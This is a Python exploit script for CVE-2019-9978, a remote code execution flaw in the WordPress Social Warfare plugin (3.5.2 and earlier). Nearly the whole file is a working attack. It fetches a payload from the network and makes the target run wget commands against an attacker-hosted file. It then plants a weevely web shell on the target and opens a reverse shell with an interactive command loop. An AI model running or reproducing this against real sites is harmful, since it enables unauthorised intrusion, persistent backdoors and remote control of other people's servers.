# Title: RCE in Social Warfare Plugin ( <=3.5.2 )
# CVE: CVE-2019-9978
# Script Authors: Jessi & Rin
# Usage: python3 social-warefare-rce.py http://example.com/wordpress/ lhost
# Setups an http server, servers a python payload to exeute a reverse PTY shell connection

import sys
import os
import requests
import re
import threading
import time
import socket
import fileinput

# Warn if no Arguments
if len(sys.argv) <= 1:
    print("Usage: python3 social-warfare-rce.py http://example.com/wordpress/ lhost")
    exit(1)

# Pretty ASCII Art/Intro :)
print("""\
@@@@@@@O@@@@@@@@@@@OOOOOOO@OOOOO@@@@@@@@@@@@OO@@@
@@@@@OooOO,OOOOOoooooooooooOOooooooO@@@OOOOOOO@@@
@@@@@ooooOO^=ooooooooooooooooooooooooOOOOOOOOO@@@
@@@@@ooooOOO/oooooooooooooooooooooooooOOOOOOo^@@@
@@@@@OooO/[[\oooooooooooooooooooooooOooOOOOoo=@@@
@@@@@Ooo`**/oooooooooooooooooooooooooOooOOOooO@@@
@@@@@@@OO`/ooooooooooooooooooooooooooOoooOO/@@@@@
@@@@@@@@ooooooooooooOo[ooooooooooooooOOooO@@@@@@@
@@@@@@@Oooooooo/=ooOO,oooOoooooooooooOOooOO@@@@@@
@@@@@@@OooooooO^=oOO^oooOO[oo/=ooooooOOOoOoO@@@@@
@@@@@@Ooooo/oO/`oO[ OOoO/  \O,oooooooOOOOOoO@@@@@
@@@@@@ooooo^oO^=`  ,O[`     O/oooooOOOO[OOOO@@@@@
@@@@@oooooO^O.O             ,ooooooO/= ,OOOOO@@@@
@@@OOoooooO^=^     [[\OO\            ,].OOOoo@@@@
@@@OoooooooO=\           `          O[  OOooooO@@
@@@@OOOooooOO/  ,]]]]]`                 OooooO@@@
@@@@OOOOO/  =`/`........,\`       ,]]]],OOOOO\@@@
@@@@@@@@    =...............[  /`........\@@O@@@@
@@@@@@@`   ,^.............................O@@@@@@
@@@@@@`    /...............................O@@@@@
@@@@@O     =..................../[[].......O@@@@@
@@@@@       ^..............,`[[..`   ^..../O@@@@@
@@@@O=/o]]] =`............,]]`  /    ,]`., =@@@@@
@@@@@@^                  .         =      [O@@@@@
@@@@@@@`                           ,\       O@@@@/""")
print("\n")
print("WordPress Social Warfare Plugin RCE <=3.5.2")
print("CVE-2019-9978")
print("\n")
time.sleep(2)
os.system("clear")

# Required Arguments
target = sys.argv[1]
lhost = sys.argv[2]

# Generate payload
print("[!] Generating payload")
os.system("wget https://raw.githubusercontent.com/jessisec/scripts/main/cve-2019-9978/payload.py -O payload.py >/dev/null 2>&1")
for line in fileinput.input(['payload.py'], inplace=True):
    print(line.replace('IP_REPLACE_ME', lhost), end='')

# Listener
SERVER_HOST = "0.0.0.0" # Listent on all interfaces
SERVER_PORT = 443
BUFFER_SIZE = 1024 * 256 # 256KB max size of messages, feel free to increase

# Seperator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# Create socket object
s = socket.socket()

# Bind the socket to all interfaces
def listener():
    s.bind((SERVER_HOST, SERVER_PORT))
    s.listen(5)
    #print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
    print("[+] Executing exploit\n")
    print("[*] CTCL + C to exit")

    # Accept any connections
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    # Receive pwd of the fox
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)

    # C2 Comms loop
    while True:
        # Get command from input prompt
        command = input(f"social~warfare:{cwd} # ")
        if not command.strip():
            # Empty command
            continue
        # Send command
        client_socket.send(command.encode())
        if command.lower() == "exit":
            break
        # Retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        # Split command output and current directory
        results, cwd = output.split(SEPARATOR)
        # Print output
        print(results)

# Serve payload
def http():
    os.system("python3 -m http.server 80 >/dev/null 2>&1")
def http_server():
    threading.Thread(target=http).start()

# Payload stager
def payload_stager():
    url = target + f'wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://{lhost}/payload.txt'
    r = requests.get(url)
# Background task for payload stager
def payload_stager_bg():
    threading.Thread(target=payload_stager).start()

# Download payload onto rhost
def stage1():
    cmd = f"wget http://{lhost}/payload.py"
    f = open("payload.txt", "w")
    f.write(f"<pre>system('{cmd}')</pre>")
    f.close()

# Weevly stager
os.system("weevely generate s0c14l exec.php >/dev/null 2>&1")

def stage2():
    cmd = f"wget http://{lhost}/exec.php -O exec.php"
    f = open("payload.txt", "w")
    f.write(f"<pre>system('{cmd}')</pre>")
    f.close()

def execute():
    os.system(f"weevely {target}wp-admin/exec.php s0c14l 'python3 payload.py' >/dev/null 2>&1")
def bg_execute():
    threading.Thread(target=execute).start()

# Exploit
http_server()
print("[!] Serving payload")
print("[!] Sending stage 1")
stage1()
payload_stager_bg()
time.sleep(3)
print("[+] Sending stage 2")
stage2()
payload_stager_bg()
time.sleep(1)
bg_execute()
listener()
